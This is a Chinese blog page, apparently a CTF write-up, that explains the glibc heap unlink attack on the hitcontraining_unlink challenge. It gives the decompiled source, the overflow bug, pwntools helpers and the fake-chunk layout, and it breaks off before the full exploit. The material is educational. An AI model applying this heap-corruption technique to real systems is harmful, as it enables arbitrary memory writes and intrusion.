@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,heap," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Linux 下堆溢出unlink实例。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink">
+<meta property="og:url" content="http://www.ethushiroha.com/unlink.html">
+<meta property="og:site_name" content="stdout">
+<meta property="og:description" content="Linux 下堆溢出unlink实例。">
+<meta property="og:locale">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921286897.png">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921508591.png">
+<meta property="article:published_time" content="2020-07-20T01:20:10.000Z">
+<meta property="article:modified_time" content="2020-11-25T13:44:32.245Z">
+<meta property="article:author" content="stdout">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921286897.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.ethushiroha.com/unlink.html"/>
+
+
+
+
+
+  <title>unlink | stdout</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">stdout</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-文章">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友联">
+          <a href="/py.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友联
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.ethushiroha.com/unlink.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="stdout">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">unlink</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-20T09:20:10+08:00">
+                2020-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/heap/" itemprop="url" rel="index">
+                    <span itemprop="name">heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Linux 下堆溢出unlink实例。</p>
+<a id="more"></a>
+
+<h2 id="unlink-简介"><a href="#unlink-简介" class="headerlink" title="unlink 简介"></a>unlink 简介</h2><p>我知道自己介绍肯定很菜,所以干脆用 CTF WIKI 的来吧<br><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/heap/unlink/">CTFWIKI unlink</a></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>做示例的是 <code>hitcontraining_unlink</code></p>
+<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v3 = hello_message;</span><br><span class="line">  v3[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, _QWORD))*v3)(<span class="number">16L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> *))v3[<span class="number">1</span>])(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;the box is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v2 = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild length&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        itemlist[<span class="number">4</span> * i] = v2;</span><br><span class="line">        *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the name of item:&quot;</span>);</span><br><span class="line">        *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, *(<span class="keyword">void</span> **)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>], v2)) = <span class="number">0</span>;</span><br><span class="line">        ++num;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="show-item"><a href="#show-item" class="headerlink" title="show_item"></a>show_item</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !num )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>] )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d : %s&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, *(_QWORD *)&amp;itemlist[<span class="number">4</span> * i + <span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_401089);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">remove_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    v1 = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="keyword">void</span> **)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>]);</span><br><span class="line">      *(_QWORD *)&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">      itemlist[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove successful!!&quot;</span>);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 change_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST08_4</span><br><span class="line">  int v2; &#x2F;&#x2F; [rsp+4h] [rbp-2Ch]</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+10h] [rbp-20h]</span><br><span class="line">  char nptr; &#x2F;&#x2F; [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *(_QWORD *)&amp;itemlist[4 * v2 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Please enter the length of item name:&quot;, &amp;buf);</span><br><span class="line">      read(0, &amp;nptr, 8uLL);</span><br><span class="line">      v0 &#x3D; atoi(&amp;nptr);</span><br><span class="line">      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);</span><br><span class="line">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[4 * v2 + 2] + (signed int)read(0, *(void **)&amp;itemlist[4 * v2 + 2], v0)) &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在 <code>change_item</code> 中没有判断输入字符的个数,导致堆溢出,由于没有开启 <code>PIE</code> 所以 <code>unlink</code> 很方便</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
+
+<h4 id="伪造堆块"><a href="#伪造堆块" class="headerlink" title="伪造堆块"></a>伪造堆块</h4><p>先 <code>add</code> 三个堆块, 然后利用 <code>edit</code> 的堆溢出,修改 堆块1 ,在 堆块1 中伪造一个假的 chunk,假的 chunk 的结构如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-------------------------</span><br><span class="line">|  presize  |    size   |</span><br><span class="line">|           |    0x20   |</span><br><span class="line">-------------------------</span><br><span class="line">|  fake_fd  |  fake_bk  |</span><br><span class="line">|0x6020D8-0x18| 0x6020D8-0x10|</span><br><span class="line">-------------------------</span><br><span class="line">|  presize  |   size    |</span><br><span class="line">|    0x20   |   0x20    |</span><br><span class="line">-------------------------</span><br><span class="line">|  presize  |   size    |   &lt;----- next chunk</span><br><span class="line">|    0x30   |    0x90   |</span><br><span class="line">-------------------------</span><br></pre></td></tr></table></figure>
+<p>修改了 <code>next chunk</code> 的 <code>inuse</code> 位为0,这样就假装已经被 <code>free</code> 了<br>为什么是 <code>0x6020D8</code> <code>-0x18</code> 和 <code>-0x10</code> 呢<br>因为在内存中,<strong>存放 堆块1 的地址是 <code>0x6020D8</code></strong><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921286897.png" alt="file"></p>
+<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>伪造完成之后,释放 堆块2 这个时候在它看来前一个堆块是已经被释放的空闲堆块,那么就要执行 <code>unlink</code> 操作,检查 <code>fd bk</code> 之后,发现符合条件,于是就在 <code>fd + 0x18</code> 的地方写入 堆块1 的地址<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921508591.png" alt="file"></p>
+<p>接着 <code>edit</code> 堆块1 就是在修改内存了,可以让 堆块0 指向任意的地址(可写的)去改写</p>
+<h4 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h4><p>这里在 leak libc 之后选择 <code>atoi</code>函数</p>
